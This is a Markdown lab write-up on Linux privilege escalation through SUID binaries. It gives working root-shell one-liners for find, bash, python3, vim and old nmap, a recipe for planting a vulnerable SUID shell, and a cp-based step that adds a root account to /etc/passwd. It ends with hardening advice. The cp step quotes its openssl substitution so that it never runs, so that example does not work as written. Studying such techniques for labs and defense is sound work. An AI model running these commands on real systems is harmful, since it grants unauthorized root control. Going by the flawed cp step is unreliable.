# 🔼 Lab: Linux Privilege Escalation — SUID Binaries

**Category:** Privilege Escalation  
**OS:** Linux  
**Tools:** find, GTFOBins, custom scripts  
**Status:** ✅ Complete

---

## 📝 Overview

SUID (Set User ID) binaries run with the permissions of the file **owner**, regardless of who executes them. When a SUID binary is owned by root and can be abused to execute arbitrary code, it leads to privilege escalation.

---

## 🔍 Finding SUID Binaries

```bash
# Find all SUID binaries on the system
find / -perm -u=s -type f 2>/dev/null

# Find SUID in common locations
find /usr /bin /sbin -perm -u=s -type f 2>/dev/null

# More verbose output
find / -perm -4000 -ls 2>/dev/null
```

**Suspicious SUID binaries to look for:**
```
/usr/bin/find
/usr/bin/python3
/usr/bin/bash  ← Extremely dangerous
/usr/bin/vim
/usr/bin/nmap
/usr/bin/more
/usr/bin/less
/usr/bin/awk
/usr/bin/cp
```

---

## 💥 Exploitation Examples

### 1. SUID find

```bash
find / -name notafile -exec /bin/sh -p \;
# id → uid=1000(user) gid=1000(user) euid=0(root) ✅
```

### 2. SUID bash

```bash
/bin/bash -p
# bash-5.0# id → uid=1000 euid=0(root) ✅
```

### 3. SUID python3

```python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id → root ✅
```

### 4. SUID vim

```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
# OR
vim -c ':!sh'
# id → root (euid) ✅
```

### 5. SUID cp

```bash
# Copy /etc/passwd to writable location, add root user, copy back
cp /etc/passwd /tmp/passwd_backup
echo 'hacker:$(openssl passwd -1 hacker):0:0:root:/root:/bin/bash' >> /tmp/passwd_backup
cp /tmp/passwd_backup /etc/passwd
su hacker  # password: hacker
# id → root ✅
```

### 6. SUID nmap (older versions)

```bash
# Nmap < 5.20 with --interactive flag
nmap --interactive
# nmap> !id → root ✅
```

---

## 🔧 Custom SUID Shell (Lab Setup)

To create a vulnerable binary in your own lab:

```bash
# As root — create vulnerable binary
cp /bin/bash /tmp/suid_bash
chmod 4755 /tmp/suid_bash

# As normal user — exploit it
/tmp/suid_bash -p
# id → euid=0(root) ✅

# Cleanup
rm /tmp/suid_bash
```

---

## 🛡️ Defense & Hardening

```bash
# Audit SUID binaries regularly
find / -perm -u=s -type f 2>/dev/null | sort

# Remove SUID from unnecessary binaries
chmod -s /usr/bin/find
chmod u-s /usr/bin/python3

# Mount filesystems with nosuid option
# /etc/fstab:
/dev/sdb1  /data  ext4  defaults,nosuid  0  2

# Monitor SUID changes with auditd
auditctl -a always,exit -F perm=6000 -k suid_sgid
```

---

## 🧠 Key Takeaways

1. **SUID root binaries are dangerous** — any that allow code execution lead to root
2. **GTFOBins** (gtfobins.github.io) is the definitive SUID exploit reference
3. **Always check SUID** during Linux enumeration — it's often overlooked
4. **Restrict SUID** to only essential binaries (ping, sudo, passwd)
5. **nosuid mount option** prevents SUID exploitation on mounted filesystems

---

## 📚 References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [TryHackMe — Linux PrivEsc Room](https://tryhackme.com/room/linuxprivesc)

---

*All exploitation performed in isolated lab environments. No production systems targeted.*
